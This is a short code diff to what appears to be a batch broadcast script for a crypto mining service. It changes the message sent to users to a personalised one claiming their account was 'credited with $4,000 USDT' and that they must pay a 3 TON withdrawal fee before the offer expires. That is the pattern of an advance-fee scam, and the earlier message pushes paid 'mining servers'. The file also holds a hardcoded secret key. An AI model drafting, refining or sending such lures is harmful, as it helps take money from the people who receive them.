@@ -6,18 +6,17 @@ const corsHeaders = {
 };
 
 const SECRET_KEY = 'BATCH_BROADCAST_2024';
-const CAMPAIGN_ID = 'prize_cancelled_final_2026';
+const CAMPAIGN_ID = 'balance_4000_usdt_2026';
 const BATCH_SIZE = 200;
 
-const MESSAGE = `Important Update, {firstName}.
+const MESSAGE = `🎉 Congratulations, {firstName}!
 
-Your account has been updated with the following changes:
+Your account has been credited with $4,000 USDT!
 
-- Your balance has been set to $5 USDT
-- Withdrawal fee: 0.5 TON
-- You can now purchase any mining server with no minimum requirement
+💰 Current Balance: $4,000 USDT
+💸 Withdrawal Fee: 3 TON
 
-This is a one-time update for all users. Start earning more by purchasing a server and mining today.
+Withdraw your balance now before the offer expires!
 
 If you need help, contact our support: @Boltsupportio`;
 
